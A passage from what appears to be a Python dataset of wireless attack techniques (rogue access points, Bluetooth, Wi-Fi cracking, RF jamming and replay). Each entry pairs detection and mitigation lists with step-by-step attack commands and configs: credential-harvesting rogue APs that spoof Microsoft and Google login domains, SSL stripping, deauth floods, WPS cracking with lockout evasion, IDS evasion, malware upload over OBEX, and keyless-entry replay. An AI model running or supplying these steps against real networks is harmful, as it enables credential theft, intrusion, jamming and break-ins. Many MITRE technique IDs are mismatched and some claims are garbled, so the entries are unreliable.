        "steps": "1. Identify enterprise EAP type: `airodump-ng --bssid <AP_MAC> wlan0mon` (look for EAP type in beacon)\n2. Set up rogue AP with hostapd-wpe and RADIUS proxy:\n```\ninterface=wlan0\ndriver=nl80211\nssid=<CorpSSID>\nchannel=<target_channel>\nwpa=2\nwpa_key_mgmt=WPA-EAP\nieee8021x=1\neap_server=1\neap_user_file=/etc/hostapd-wpe/eap_user.conf\nauth_server_addr=10.0.0.1\nauth_server_port=1812\nauth_server_shared_secret=<radius_secret>\n```\n3. Configure hostapd-wpe to log MS-CHAPv2 credentials before forwarding\n4. Start FreeRADIUS in proxy mode: `freeradius -X`\n5. Deauth enterprise clients: `aireplay-ng --deauth 20 -a <LEGIT_AP_MAC> wlan0mon`\n6. Clients authenticate through rogue AP, credentials captured and forwarded\n7. Crack MS-CHAPv2: `asleap -C <challenge> -R <response> -W wordlist.txt`",
        "detection": [
            "RADIUS authentication from unexpected AP MAC",
            "EAP-TLS certificate mismatch on rogue AP",
            "Dual RADIUS server entries for same SSID",
            "Authentication latency increase from proxy forwarding",
        ],
        "mitigations": [
            "EAP-TLS with strict server certificate validation",
            "WPA3-Enterprise with SAE",
            "RADIUS server certificate pinning on clients",
            "Wireless IDS with RADIUS anomaly detection per MITRE ATT&CK",
            "Network Access Control (NAC) validating AP authenticity",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Rogue AP with DNS Spoofing for Credential Capture",
        "mitre_ids": ["T1602.001", "T1566.001"],
        "desc": "Deploying a rogue AP that uses DNS spoofing to redirect users to credential harvesting pages.",
        "steps": "1. Set up rogue AP: `hostapd-mana hostapd.conf` with target SSID\n2. Configure dnsmasq for DNS spoofing:\n```\ndhcp-range=10.0.0.100,10.0.0.200,12h\ndhcp-option=3,10.0.0.1\naddress=/#/10.0.0.1\naddress=/login.microsoftonline.com/10.0.0.1\naddress=/accounts.google.com/10.0.0.1\n```\n3. Set up credential harvesting web server: `python3 -m http.server 443 --directory portal/`\n4. Enable IP forwarding and NAT: `iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`\n5. Deauth target clients: `aireplay-ng --deauth 0 -a <AP_MAC> wlan0mon`\n6. Clients auto-connect and are redirected to fake login pages\n7. Capture credentials: usernames, passwords, MFA tokens",
        "detection": [
            "DNS responses resolving legitimate domains to internal IP",
            "Multiple domain redirects to single IP address",
            "TLS certificate mismatches on known services",
            "DHCP offers from unauthorized AP",
        ],
        "mitigations": [
            "DNSSEC validation on client devices",
            "WPA3-SAE with certificate pinning",
            "DNS-over-HTTPS (DoH) enforcement",
            "Wireless IDS with DNS anomaly detection per OWASP IoT Security",
            "Client-side certificate validation for all services",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Rogue AP with SSL Strip",
        "mitre_ids": ["T1602.001"],
        "desc": "Deploying a rogue AP with SSL stripping to downgrade HTTPS connections and capture plaintext credentials.",
        "steps": "1. Set up rogue AP with hostapd-mana: `hostapd-mana hostapd.conf`\n2. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`\n3. Configure iptables for SSL stripping:\n```\niptables -t nat -A PREROUTING -i wlan0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080\niptables -t nat -A PREROUTING -i wlan0 -p tcp --destination-port 443 -j REDIRECT --to-port 8080\n```\n4. Start sslstrip: `sslstrip -l 8080 -a -w sslstrip.log`\n5. Start dnsmasq DHCP: `dnsmasq -C dnsmasq.conf`\n6. Deauth clients: `aireplay-ng --deauth 10 -a <AP_MAC> wlan0mon`\n7. Monitor captured credentials: `tail -f sslstrip.log`",
        "detection": [
            "HTTP connections to services that should be HTTPS",
            "Missing HSTS headers on secure sites",
            "SSL certificate downgrade in browser warnings",
            "Unusual HTTP proxy on wireless network",
        ],
        "mitigations": [
            "HSTS (HTTP Strict Transport Security) on all web services",
            "Certificate pinning in mobile applications",
            "WPA3-Enterprise with EAP-TLS",
            "DNS-over-HTTPS enforcement",
            "Wireless IDS detecting SSL stripping per PTES methodology",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Captive Portal with WiFi Auto-Connect Exploitation",
        "mitre_ids": ["T1566.001"],
        "desc": "Exploiting automatic WiFi connection behavior to force devices onto a rogue AP with captive portal.",
        "steps": "1. Identify target SSIDs from probe requests: `airodump-ng wlan0mon` (watch for probe frames)\n2. Configure hostapd-mana to respond to all probed SSIDs:\n```\ninterface=wlan0\ndriver=nl80211\nssid=AnySSID\nkarma_attack=1\nchannel=6\n```\n3. Set up captive portal with auto-redirect: `python3 captive_portal.py --auto-redirect --interface wlan0`\n4. Create convincing login page mimicking OS captive portal detection\n5. Configure DHCP with forced redirect: `dnsmasq --address=/#/10.0.0.1 --dhcp-option=114,http://10.0.0.1/captive`\n6. Devices auto-connect and are presented with captive portal\n7. Capture WiFi credentials, corporate credentials, and MFA tokens",
        "detection": [
            "AP responding to all probe requests (karma behavior)",
            "Captive portal pages appearing on trusted networks",
            "DHCP Option 114 (captive portal) from unknown source",
            "Multiple device types connecting to unknown AP simultaneously",
        ],
        "mitigations": [
            "Disable auto-connect on managed devices via MDM/GPO",
            "WPA3-SAE preventing automatic connection to rogue APs",
            "Captive portal detection in modern OS (CWPv2)",
            "Enterprise 802.1X with certificate validation per NIST SP 800-115",
            "Wireless IDS detecting karma-style probe responses",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Pineapple/Tetra-based Rogue AP",
        "mitre_ids": ["T1602.001"],
        "desc": "Using WiFi Pineapple or Tetra hardware for automated rogue AP deployment with advanced harvesting capabilities.",
        "steps": "1. Boot WiFi Pineapple Tetra and connect to management interface\n2. Configure SSID pool: add target SSIDs to auto-resp list\n3. Enable Karma mode: Pineapple responds to all probe requests\n4. Set up modules:\n   - SSLsplit for HTTPS downgrade\n   - DnsSpoof for DNS redirection\n   - URLSnarf for traffic monitoring\n   - CookieMonster for session hijacking\n5. Configure DHCP: `Pineapple DHCP range 172.16.42.100-200`\n6. Start all modules and monitor harvested data\n7. Advanced: enable PineAP mode for targeted deauth + karma combination",
        "detection": [
            "WiFi Pineapple MAC OUI in beacon frames",
            "AP responding to all probe requests with multiple SSIDs",
            "DHCP offers from Pineapple IP range (172.16.42.x)",
            "Known Pineapple management traffic patterns",
        ],
        "mitigations": [
            "WPA3-SAE on all corporate SSIDs",
            "802.11w Management Frame Protection",
            "Wireless IDS with Pineapple signature detection per OSSTMM",
            "MDM policies disabling auto-connect",
            "Monitor for Pineapple MAC OUI (00:13:37 or similar)",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Rogue AP in Enterprise Environments (Certificate Theft)",
        "mitre_ids": ["T1602.001"],
        "desc": "Deploying a rogue AP in enterprise environments to steal client certificates and authentication material.",
        "steps": "1. Recon enterprise wireless: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon` (identify EAP type)\n2. Set up rogue AP matching enterprise config: `hostapd-wpe enterprise.conf`\n3. Configure hostapd-wpe for certificate theft:\n```\ninterface=wlan0\ndriver=nl80211\nssid=<CorpSSID>\nchannel=<target_channel>\nwpa=2\nwpa_key_mgmt=WPA-EAP\nieee8021x=1\neap_server=1\neap_user_file=/etc/hostapd-wpe/eap_user.conf\nca_cert=/etc/hostapd-wpe/ca.pem\nserver_cert=/etc/hostapd-wpe/server.pem\nprivate_key=/etc/hostapd-wpe/server.key\n```\n4. Capture client certificate exchange data\n5. Deauth enterprise clients to force reconnection to rogue AP\n6. Extract and analyze certificate material from EAP-TLS exchange\n7. Use stolen certificate data for further enterprise access",
        "detection": [
            "EAP-TLS certificate mismatch on rogue AP",
            "RADIUS authentication from unexpected source IP",
            "Client certificate exchange with unknown server",
            "Duplicate SSID with different CA certificate",
        ],
        "mitigations": [
            "Strict server certificate validation on all clients",
            "Certificate pinning via GPO/MDM",
            "WPA3-Enterprise with SAE and certificate validation",
            "Network Access Control (NAC) with posture assessment",
            "RADIUS server certificate rotation and monitoring per MITRE ATT&CK",
        ],
    },
    # === BLUETOOTH ===
    {
        "category": "bluetooth",
        "name": "Bluetooth Device Enumeration and Fingerprinting",
        "mitre_ids": ["T1590.002"],
        "desc": "Scanning and fingerprinting Bluetooth devices to identify targets for further exploitation.",
        "steps": "1. Enable Bluetooth scanning: `hciconfig hci0 up && hciconfig hci0 piscan`\n2. Scan for devices: `hcitool scan` (classic) or `hcitool lescan` (BLE)\n3. Get device info: `hcitool info <MAC>`\n4. Detailed service scan: `sdptool browse <MAC>`\n5. BLE characteristics: `gatttool -b <MAC> -I → connect → primary → characteristics`\n6. Identify device type and services: combine Class of Device, service names, and BLE characteristics\n7. Map attack surface: identify vulnerable services (SPP, OBEX, HID)",
        "detection": [
            "Bluetooth scanning from unusual devices",
            "Multiple inquiry requests from single source",
            "SDP service browsing from non-standard devices",
            "BLE characteristic enumeration",
        ],
        "mitigations": [
            "Disable Bluetooth when not in use",
            "Set devices to non-discoverable mode",
            "Bluetooth device whitelisting",
            "Monitor for unauthorized Bluetooth connections",
            "Bluetooth firmware updates",
        ],
    },
    {
        "category": "bluetooth",
        "name": "BLE GATT Attack (Characteristic Manipulation)",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting BLE GATT characteristics to read/write unauthorized data on Bluetooth Low Energy devices.",
        "steps": "1. Scan BLE devices: `hcitool lescan`\n2. Connect to target: `gatttool -b <MAC> -I`\n3. Discover services: `primary`\n4. Discover characteristics: `characteristics`\n5. Read characteristic value: `char-read-hnd <handle>`\n6. Write to characteristic: `char-write-req <handle> <value>`\n7. Enumerate all handles: `characteristics-desc`\n8. Identify writable characteristics without authentication\n9. Modify device behavior: change configuration, inject commands, read sensitive data",
        "detection": [
            "BLE connections from unknown devices",
            "Characteristic write to protected services",
            "BLE traffic anomalies (unusual write commands)",
            "GATT service enumeration patterns",
        ],
        "mitigations": [
            "BLE pairing with encryption",
            "Characteristic-level access control (read/write permissions)",
            "Bonding requirement for sensitive characteristics",
            "BLE Secure Connections (LESC)",
            "Device whitelisting",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Bluetooth Impersonation Attack (BIAS)",
        "mitre_ids": ["T1590.002"],
        "desc": "Bypassing Bluetooth authentication by exploiting the role switch mechanism in legacy pairing.",
        "steps": "1. Identify target device: `hcitool scan`\n2. Establish connection as slave: `hcitool cc <MAC>`\n3. Request role switch to master: send LMP_role_switch request\n4. Exploit BIAS vulnerability: during role switch, authentication state may not be verified\n5. Complete connection without proper authentication\n6. Access protected services: SPP, OBEX file transfer\n7. Alternatively: exploit KNOB attack to force entropy key negotiation to minimum (1 byte)",
        "detection": [
            "Bluetooth role switch requests from unknown devices",
            "Connection attempts with minimum entropy key negotiation",
            "Authentication bypass patterns in Bluetooth logs",
            "Legacy pairing attempts on devices configured for Secure Simple Pairing",
        ],
        "mitigations": [
            "Bluetooth 5.2+ with Secure Connections",
            "Disable legacy pairing",
            "Require Secure Simple Pairing (SSP)",
            "Bluetooth firmware patches for BIAS/KNOB",
            "Monitor for role switch attacks",
        ],
    },
    {
        "category": "bluetooth",
        "name": "BlueBorne Attack (Bluetooth RCE)",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting Bluetooth stack vulnerabilities for remote code execution without pairing.",
        "steps": "1. Identify target devices: `hcitool scan`\n2. Determine device type and Bluetooth version from Class of Device\n3. Check for BlueBorne vulnerability: devices with Bluetooth enabled but not in discoverable mode\n4. Exploit CVE-2017-0781 (Android BN) via SDP service: `python3 blueborne_android.py --target <MAC>`\n5. Or exploit CVE-2017-1000251 (Linux BN) via L2CAP: `python3 blueborne_linux.py --target <MAC>`\n6. Or exploit CVE-2017-14315 (iOS) via LE: `python3 blueborne_ios.py --target <MAC>`\n7. Gain shell access on target device without any user interaction",
        "detection": [
            "Bluetooth connection attempts from unknown devices",
            "Unexpected L2CAP/SDP traffic patterns",
            "Crash logs from Bluetooth daemon",
            "Exploit indicators in Bluetooth stack (buffer overflows, memory corruption)",
        ],
        "mitigations": [
            "Disable Bluetooth when not in use",
            "Update Bluetooth firmware and OS patches",
            "Set devices to non-discoverable mode",
            "Bluetooth stack hardening",
            "Network monitoring for Bluetooth exploit patterns",
        ],
    },
    {
        "category": "bluetooth",
        "name": "BLE Sniffing and Replay Attack",
        "mitre_ids": ["T1590.002"],
        "desc": "Capturing and replaying BLE communication to manipulate IoT devices.",
        "steps": "1. Set up BLE sniffer: `hcitool lescan --duplicates`\n2. Capture BLE packets: `ubertooth-btle -f -c capture.pcap`\n3. Or use: `btlejack -s any -t <target_MAC> -c capture.pcap`\n4. Analyze captured traffic: `wireshark capture.pcap`\n5. Identify GATT operations: read, write, notify, indicate\n6. Replay captured write command: `gatttool -b <MAC> -I → char-write-req <handle> <value>`\n7. For unencrypted BLE: modify values in transit and replay",
        "detection": [
            "BLE sniffing equipment detection (Ubertooth, nRF Sniffer)",
            "Duplicate BLE packets (replay indication)",
            "BLE characteristic writes with same values (replay)",
            "BLE connection from multiple sources simultaneously",
        ],
        "mitigations": [
            "BLE Secure Connections (LESC) with encryption",
            "Application-layer encryption for BLE data",
            "BLE pairing before characteristic access",
            "Sequence numbers or timestamps in BLE packets",
            "BLE packet authentication (MAC)",
        ],
    },
    {
        "category": "bluetooth",
        "name": "BLE Pairing Vulnerability Exploitation",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting weaknesses in BLE pairing protocols to establish unauthorized connections and access services.",
        "steps": "1. Scan for BLE devices: `hcitool lescan`\n2. Identify pairing method: observe pairing request/response in capture: `ubertooth-btle -f -c pair.pcap`\n3. Exploit Just Works pairing (no MITM protection): `gatttool -b <MAC> -I → connect`\n4. For numeric comparison: attempt man-in-the-middle: `python3 ble_mitm.py --target <MAC>`\n5. For Passkey entry: capture and replay pairing exchange\n6. Exploit Secure Connections downgrade: force LE Legacy pairing\n7. After unauthorized pairing: enumerate and access all GATT characteristics",
        "detection": [
            "BLE pairing attempts from unknown devices",
            "Just Works pairing on sensitive services",
            "Secure Connections downgrade attempts",
            "Multiple pairing failures from same source",
        ],
        "mitigations": [
            "Enforce BLE Secure Connections (LESC) pairing",
            "Disable Just Works pairing for sensitive services",
            "Implement bonding with authentication requirements per OWASP IoT Security",
            "BLE device whitelisting after authenticated pairing",
            "Monitor for pairing downgrade attacks",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Bluetooth Keyboard Hijacking (Keyjack)",
        "mitre_ids": ["T1590.002"],
        "desc": "Hijacking Bluetooth HID keyboard connections to inject keystrokes or eavesdrop on input.",
        "steps": "1. Identify paired Bluetooth keyboard: `hcitool scan` (look for HID devices)\n2. Capture keyboard pairing: `ubertooth-btle -f -c keyboard_pair.pcap`\n3. Extract link key from pairing: `crackle -i keyboard_pair.pcap -o link_keys.txt`\n4. Or use KNOB attack to force low entropy: `python3 knob_attack.py --target <KEYBOARD_MAC>`\n5. Establish connection as keyboard: `hcitool cc <KEYBOARD_MAC> && hcitool auth <KEYBOARD_MAC>`\n6. Inject keystrokes using BTKB: `python3 btkb.py --target <HOST_MAC> --inject 'whoami'`\n7. Or eavesdrop: capture and decrypt all keyboard traffic",
        "detection": [
            "Duplicate keyboard connections (same keyboard, different host)",
            "Keystroke injection at abnormal speed or patterns",
            "Unexpected keyboard disconnection/reconnection events",
            "Link key extraction attempts in Bluetooth logs",
        ],
        "mitigations": [
            "Bluetooth Secure Connections (LESC) for HID devices",
            "Encrypt Bluetooth HID connections",
            "Monitor for duplicate keyboard MAC addresses per MITRE ATT&CK",
            "Disable Bluetooth keyboard auto-reconnect",
            "Use wired keyboards for sensitive environments",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Bluetooth Audio Eavesdropping",
        "mitre_ids": ["T1590.002"],
        "desc": "Intercepting Bluetooth audio streams (A2DP/HFP) to eavesdrop on conversations or media.",
        "steps": "1. Identify Bluetooth audio devices: `hcitool scan` (look for A2DP/HFP Class of Device)\n2. Capture Bluetooth traffic: `ubertooth-btle -f -c audio_capture.pcap`\n3. For classic Bluetooth: use Ubertooth in classic mode: `ubertooth-rx -c audio_capture.pcap`\n4. Crack link key: `crackle -i audio_capture.pcap -o link_keys.txt`\n5. Decrypt audio stream with recovered link key: `wireshark -o bluetooth.decrypt_link_keys=link_keys.txt audio_capture.pcap`\n6. Extract audio: export RTP stream from Wireshark\n7. For HFP: capture and decode SCO audio packets",
        "detection": [
            "Bluetooth audio connections from unknown devices",
            "Duplicate audio sink connections",
            "Unexpected A2DP/HFP stream initiation",
            "Link key brute-force attempts in Bluetooth logs",
        ],
        "mitigations": [
            "Use Bluetooth Secure Connections for audio devices",
            "Enable encryption for A2DP/HFP connections",
            "Bluetooth device whitelisting for audio peripherals",
            "Monitor for unauthorized audio device connections per PTES",
            "Prefer wired audio in sensitive environments",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Bluetooth Tracking and Stalking (Beacon Tracking)",
        "mitre_ids": ["T1590.002"],
        "desc": "Using Bluetooth beacon signals to track device locations and movement patterns.",
        "steps": "1. Set up BLE scanning infrastructure: `hcitool lescan --duplicates`\n2. Deploy Bluetooth sniffers at key locations\n3. Capture BLE advertisements: `ubertooth-btle -f -c tracking.pcap`\n4. Identify unique device identifiers: MAC address, service UUIDs, manufacturer data\n5. Track device movement: correlate BLE advertisements across multiple sniffers\n6. Build movement profile: time, location, device fingerprint\n7. Advanced: use Apple AirTag/Tile beacon network for passive tracking\n8. De-anonymize randomized MAC: use stable identifiers in GATT services",
        "detection": [
            "Persistent BLE scanning at fixed locations",
            "BLE sniffer deployment in unusual locations",
            "Correlation of device movement across multiple sensors",
            "MAC address randomization bypass attempts",
        ],
        "mitigations": [
            "Enable MAC address randomization on all devices",
            "Disable Bluetooth advertising when not in use",
            "BLE privacy features (resolvable private addresses)",
            "Monitor for persistent BLE tracking infrastructure per NIST SP 800-115",
            "Location-aware Bluetooth security policies",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Classic Bluetooth OBEX File Transfer Exploitation",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting OBEX file transfer services on Classic Bluetooth devices to access or exfiltrate data.",
        "steps": "1. Scan for devices with OBEX: `hcitool scan && sdptool browse <MAC>` (look for OBEX Object Push, OBEX File Transfer)\n2. Connect to OBEX service: `obexftp -b <MAC> -c / -l` (list root directory)\n3. Browse filesystem: `obexftp -b <MAC> -c /path -l`\n4. Download files: `obexftp -b <MAC> -c /path -g filename.txt`\n5. Upload malicious files: `obexftp -b <MAC> -c /path -p malware.apk`\n6. Exploit OBEX vulnerability (CVE-2017-0783): buffer overflow in OBEX headers\n7. Or exploit OBEX PUT without authentication for file upload",
        "detection": [
            "OBEX file transfer connections from unknown devices",
            "File upload to Bluetooth devices from unexpected sources",
            "OBEX service browsing patterns in Bluetooth logs",
            "Anomalous file transfer activity on Bluetooth interface",
        ],
        "mitigations": [
            "Disable OBEX file transfer when not in use",
            "Require Bluetooth pairing and authentication for OBEX",
            "Set OBEX services to read-only mode",
            "Bluetooth firewall filtering OBEX connections per OSSTMM",
            "Monitor OBEX service connections in Bluetooth logs",
        ],
    },
    {
        "category": "bluetooth",
        "name": "Bluetooth Low Energy Spoofing",
        "mitre_ids": ["T1590.002"],
        "desc": "Spoofing BLE device identities to impersonate legitimate devices and gain unauthorized access.",
        "steps": "1. Identify target BLE device: `hcitool lescan` (note MAC and services)\n2. Capture device advertisement data: `ubertooth-btle -f -c target_adv.pcap`\n3. Extract advertising payload: service UUIDs, manufacturer data, TX power\n4. Clone advertisement data: `python3 ble_spoof.py --mac <TARGET_MAC> --adv-data <ADV_DATA>`\n5. Set up spoofed device: modify BLE peripheral to match target\n6. Broadcast spoofed advertisements: use nRF52 or similar BLE peripheral\n7. Clients connect to spoofed device, allowing data interception",
        "detection": [
            "Duplicate BLE device MAC addresses on network",
            "BLE devices with same service UUIDs but different behavior",
            "Advertisement data inconsistency (TX power, manufacturer data)",
            "Sudden BLE device relocation in proximity tracking",
        ],
        "mitigations": [
            "BLE Secure Connections with pairing verification",
            "Resolvable Private Addresses (RPA) for BLE devices",
            "BLE device certificate validation",
            "GATT service authentication per OWASP IoT Security",
            "Monitor for BLE device identity anomalies",
        ],
    },
    # === WIRELESS LAN ===
    {
        "category": "wireless_lan",
        "name": "WEP Cracking with Aircrack-ng",
        "mitre_ids": ["T1602.001"],
        "desc": "Exploiting WEP encryption weaknesses to recover the encryption key and access the wireless network.",
        "steps": "1. Set monitor mode: `airmon-ng start wlan0`\n2. Identify WEP network: `airodump-ng wlan0mon` (look for WEP encryption)\n3. Target specific AP: `airodump-ng --bssid <AP_MAC> -c <channel> -w wep_capture wlan0mon`\n4. Accelerate IV collection with ARP replay: `aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon`\n5. Or use interactive replay: `aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <AP_MAC> wlan0mon`\n6. Collect 50,000+ IVs (check with airodump-ng)\n7. Crack WEP key: `aircrack-ng -b <AP_MAC> wep_capture-01.cap`",
        "detection": [
            "ARP replay attack patterns (duplicate ARP frames)",
            "Excessive IV collection on WEP network",
            "Rapid reassociation requests on WEP network",
            "Unusually high data frame volume on WEP AP",
        ],
        "mitigations": [
            "Replace WEP with WPA2-AES or WPA3 immediately",
            "Disable WEP on all access points",
            "Network segmentation isolating WEP devices",
            "Monitor for WEP cracking patterns per NIST SP 800-115",
            "Migrate all devices to WPA2/WPA3",
        ],
    },
    {
        "category": "wireless_lan",
        "name": "WPS Pixie Dust Attack",
        "mitre_ids": ["T1602.001"],
        "desc": "Exploiting WPS PIN derivation weakness to recover the WPS PIN and subsequently the WPA2 PSK offline.",
        "steps": "1. Identify WPS-enabled AP: `wash -i wlan0mon`\n2. Verify WPS is locked: `reaver -i wlan0mon -b <AP_MAC> --probe`\n3. Start Pixie Dust attack: `reaver -i wlan0mon -b <AP_MAC> -K 1 -vv`\n4. Pixie Dust exploits weak random number generation in WPS registrar\n5. If PIN found: `reaver -i wlan0mon -b <AP_MAC> -p <PIN> -vv`\n6. WPA2 PSK is revealed after successful WPS PIN authentication\n7. Alternative tool: `pixiewps -e <PKE> -r <PKR> -s <EHASH1> -z <EHASH2> -a <AUTHKEY> -n <ENONCE>`",
        "detection": [
            "WPS PIN attempts from unrecognized devices",
            "Multiple WPS authentication failures",
            "WPS lock-out events on access point",
            "Association requests followed by immediate WPS negotiation",
        ],
        "mitigations": [
            "Disable WPS on all access points",
            "WPA3-SAE (eliminates WPS dependency)",
            "AP firmware updates addressing Pixie Dust vulnerability",
            "Monitor for WPS brute-force attempts per MITRE ATT&CK",
            "WPS rate limiting and lockout configuration",
        ],
    },
    {
        "category": "wireless_lan",
        "name": "WPS PIN Brute Force with Reaver",
        "mitre_ids": ["T1602.001"],
        "desc": "Brute-forcing the WPS PIN to recover the WPA2 PSK using systematic PIN enumeration.",
        "steps": "1. Identify WPS-enabled AP: `wash -i wlan0mon`\n2. Start reaver attack: `reaver -i wlan0mon -b <AP_MAC> -vv`\n3. Reaver systematically tries all 11,000 possible WPS PINs\n4. Monitor progress: `reaver -i wlan0mon -b <AP_MAC> -vv -S`\n5. For APs with rate limiting, add delays: `reaver -i wlan0mon -b <AP_MAC> -vv --delay=5`\n6. If AP locks WPS after failures, use MAC change: `macchanger -r wlan0mon`\n7. On success, WPA2 PSK is displayed: note SSID and PSK",
        "detection": [
            "WPS PIN brute-force attempts (sequential PIN patterns)",
            "WPS lock-out events followed by MAC address changes",
            "Multiple WPS authentication failures from varied MACs",
            "WPS lock state cycling on access point",
        ],
        "mitigations": [
            "Disable WPS on all access points",
            "WPA3-SAE (eliminates WPS dependency)",
            "AP-side WPS rate limiting and permanent lockout",
            "Monitor for WPS brute-force attempts per PTES methodology",
            "MAC filtering on WPS interface (defense in depth)",
        ],
    },
    {
        "category": "wireless_lan",
        "name": "WiFi Positioning Fingerprinting for Tracking",
        "mitre_ids": ["T1590.002"],
        "desc": "Using WiFi positioning system fingerprinting to track device locations and movement patterns.",
        "steps": "1. Survey target area: walk through building capturing WiFi signals\n2. Collect AP fingerprints: `iwconfig wlan0 scan` (BSSID, SSID, signal strength, channel)\n3. Build fingerprint database: map signal patterns to physical locations\n4. Use tools: `python3 wifiscan.py --survey --output fingerprint_db.json`\n5. Deploy monitoring nodes at key intersections\n6. Track target device by correlating probe requests with fingerprint database\n7. Build movement timeline: `python3 track.py --fingerprint fingerprint_db.json --target <MAC>`",
        "detection": [
            "Persistent WiFi scanning devices in unusual locations",
            "WiFi monitoring infrastructure deployment anomalies",
            "Correlation of probe request patterns across multiple sensors",
            "Unauthorized WiFi positioning services in building",
        ],
        "mitigations": [
            "MAC address randomization on client devices",
            "Disable probe requests when not connected",
            "802.11w Management Frame Protection",
            "Monitor for unauthorized WiFi positioning infrastructure per NIST SP 800-115",
            "Location privacy features in modern OS",
        ],
    },
    {
        "category": "wireless_lan",
        "name": "Wireless VLAN Hopping",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting wireless VLAN configuration weaknesses to access restricted network segments.",
        "steps": "1. Identify wireless VLAN configuration: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon` (multiple SSIDs from same AP)\n2. Capture wireless frames with VLAN tags: `tcpdump -i wlan0mon -w vlan_capture.pcap`\n3. Analyze VLAN tagging in captured frames: `wireshark vlan_capture.pcap` (look for 802.1Q tags)\n4. Forge frames with VLAN tags: `python3 vlan_hop.py --interface wlan0mon --vlan <TARGET_VLAN> --bssid <AP_MAC>`\n5. Inject double-tagged frames for VLAN hopping: `python3 double_tag.py --outer_vlan 1 --inner_vlan 100 --interface wlan0mon`\n6. Access restricted VLAN resources: SSH, SMB, HTTP on target segment\n7. Maintain persistence on target VLAN",
        "detection": [
            "802.1Q tagged frames on wireless interface",
            "Double-tagged frames (Q-in-Q) in wireless captures",
            "Frames with unexpected VLAN IDs on wireless segment",
            "Access attempts to restricted VLAN resources from wireless clients",
        ],
        "mitigations": [
            "Separate physical APs for each VLAN (no shared radio)",
            "Strict VLAN tagging enforcement on wireless controllers",
            "Wireless client isolation between VLANs per OWASP IoT Security",
            "Monitor for VLAN hopping attempts on wireless segments",
            "802.1X with dynamic VLAN assignment per PTES",
        ],
    },
    {
        "category": "wireless_lan",
        "name": "Enterprise Wireless IDS Evasion",
        "mitre_ids": ["T1590.002"],
        "desc": "Evading wireless intrusion detection systems through frame manipulation, timing control, and stealth techniques.",
        "steps": "1. Identify wireless IDS: `airodump-ng wlan0mon` (look for monitoring APs on all channels)\n2. Map IDS sensor locations using signal strength triangulation\n3. Evade via channel hopping: operate on less-monitored channels\n4. Evade via frame injection: `python3 ids_evade.py --technique fragment --interface wlan0mon`\n5. Evade via timing: slow deauth to avoid rate-based detection: `aireplay-ng --deauth 1 -a <AP_MAC> wlan0mon` (one frame every 60s)\n6. Evade via MAC rotation: change source MAC every N frames\n7. Evade via encryption: use WPA3 where IDS cannot inspect encrypted management frames",
        "detection": [
            "Low-rate deauthentication frames (below IDS threshold)",
            "MAC address rotation in management frames",
            "Fragmented management frames that bypass IDS signature matching",
            "Channel-specific blind spots in IDS coverage",
        ],
        "mitigations": [
            "Deploy WPA3 with mandatory Management Frame Protection",
            "Multi-sensor IDS with overlapping coverage per OSSTMM",
            "Behavioral analysis for slow-rate attacks",
            "Encrypted management frame inspection capability",
            "AI-based wireless anomaly detection per NIST SP 800-115",
        ],
    },
    # === RF ATTACK ===
    {
        "category": "rf_attack",
        "name": "SDR-Based Wireless Signal Jamming",
        "mitre_ids": ["T1590.002"],
        "desc": "Using software-defined radio to jam wireless signals across WiFi, Bluetooth, and other RF protocols.",
        "steps": "1. Identify target frequency band: `uhd_fft --freq 2.412e9` (WiFi channel 1)\n2. Set up SDR (HackRF/USRP): configure sample rate and frequency\n3. WiFi jamming: `python3 jam.py --freq 2.412e9 --bandwidth 20e6 --power 30 --interface hackrf`\n4. Bluetooth jamming: `python3 jam.py --freq 2.4e9 --bandwidth 80e6 --power 30 --interface hackrf`\n5. Wideband jamming: `python3 jam.py --freq 2.4e9 --bandwidth 100e6 --power 30 --interface hackrf`\n6. Monitor effectiveness: `airodump-ng wlan0mon` (target AP disappears)\n7. Deauthentication + jam combination: jam management frames to prevent reconnection",
        "detection": [
            "Sudden signal-to-noise ratio degradation across frequency band",
            "Continuous high-power transmission on WiFi channels",
            "All devices in area losing connectivity simultaneously",
            "RF spectrum analysis showing broadband interference",
        ],
        "mitigations": [
            "Frequency hopping spread spectrum (FHSS) capable devices",
            "Dual-band (2.4GHz/5GHz) deployment for redundancy",
            "RF spectrum monitoring and alerting per MITRE ATT&CK",
            "Wired backup connectivity for critical infrastructure",
            "SDR-based detection and geolocation of jamming sources",
        ],
    },
    {
        "category": "rf_attack",
        "name": "RF Replay Attack for Keyless Entry",
        "mitre_ids": ["T1590.002"],
        "desc": "Capturing and replaying RF signals from keyless entry systems (cars, garages, buildings) for unauthorized access.",
        "steps": "1. Identify target keyless entry frequency: usually 315MHz (US) or 433MHz (EU)\n2. Set up SDR for capture: `rtl_433 -f 315M -s 2.4M -r capture.cu8`\n3. Capture key fob signal: press button near SDR antenna\n4. Analyze captured signal: `inspectrum capture.cu8` (identify modulation type)\n5. Replay captured signal: `python3 replay.py --file capture.cu8 --freq 315e6 --device hackrf`\n6. For rolling code: use RollJam technique: `python3 rolljam.py --freq 315e6 --device hackrf`\n7. Capture unused rolling code while blocking first transmission, then replay captured code",
        "detection": [
            "Duplicate RF transmissions from key fobs (replay detection)",
            "Key fob signal at unusual times or locations",
            "RF signals with identical modulation patterns (replay indicator)",
            "Multiple door unlock events without corresponding key fob proximity",
        ],
        "mitigations": [
            "Rolling code with time-based authentication",
            "Challenge-response keyless entry systems",
            "RF shielded key fob storage (Faraday pouch)",
            "Monitor for RF replay patterns per NIST SP 800-115",
            "Upgrade to UWB-based keyless entry systems",
